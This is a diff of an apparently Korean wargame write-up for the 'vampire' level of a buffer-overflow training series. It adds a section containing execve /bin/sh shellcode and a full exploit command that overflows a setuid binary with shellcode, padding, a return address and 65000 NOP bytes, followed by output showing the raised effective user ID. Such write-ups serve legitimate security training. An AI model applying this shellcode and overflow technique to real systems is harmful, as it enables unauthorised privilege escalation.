@@ -48,9 +48,9 @@ main(int argc, char *argv[])
 }
 ```
 
-shell(24byte) = \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
+-----
 
-
+### 0x01. Analysis
 
 lret의 2번째 값이 '\xff'이면 안된다..;;
 
@@ -79,7 +79,13 @@ Breakpoint 1, 0x80484b9 in main ()
 
 argv[2]에 NULL값을 65000개 넣었더니 esp값이 0xbffe영역을 가리키고 있다.
 
+-----
 
+### 0x02. Exploit
+
+```
+shell(24byte) = \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
+```
 
 ```sh
 [troll@localhost troll]$ ./vampire `python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"+"A"*20+"\xe0\xfc\xfe\xbf"'` `python -c 'print "\x90"*65000'`
@@ -92,6 +98,4 @@ bash$ id
 uid=508(troll) gid=508(troll) euid=509(vampire) egid=509(vampire) groups=508(troll)
 ```
 
-
-
-##### **vampire / music world**
+-----
